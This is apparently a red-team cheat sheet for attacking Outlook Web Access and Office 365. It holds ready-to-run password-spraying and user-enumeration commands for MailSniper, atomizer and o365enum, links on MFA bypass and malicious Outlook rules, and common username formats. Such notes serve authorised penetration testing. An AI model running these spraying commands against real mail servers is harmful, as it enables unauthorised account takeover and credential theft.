# OWA

## Tools

```text
# https://github.com/dafthack/MailSniper
# Spraying toolkit: https://github.com/byt3bl33d3r/SprayingToolkit
Invoke-PasswordSprayOWA -ExchHostName mail.r-1x.com -UserList C:\users.txt -Password Dakota2019! -OutFile C:\creds.txt -Threads 10
python3 atomizer.py owa mail.r-1x.com 'Dakota2019!' ../users.txt

# https://github.com/gremwell/o365enum
./o365enum.py -u users.txt -p Password2 -n 1

# https://github.com/mdsecactivebreach/o365-attack-toolkit

```

## Bypasses

```text
# UserName Recon/Password Spraying - http://www.blackhillsinfosec.com/?p=4694
# Password Spraying MFA/2FA - http://www.blackhillsinfosec.com/?p=5089
# Password Spraying/GlobalAddressList - http://www.blackhillsinfosec.com/?p=5330
# Outlook 2FA Bypass - http://www.blackhillsinfosec.com/?p=5396
# Malicious Outlook Rules - https://silentbreaksecurity.com/malicious-outlook-rules/
# Outlook Rules in Action - http://www.blackhillsinfosec.com/?p=5465

Name Conventions:
- FirstnameLastinitial
- FirstnameLastname
- Lastname.firstname
```

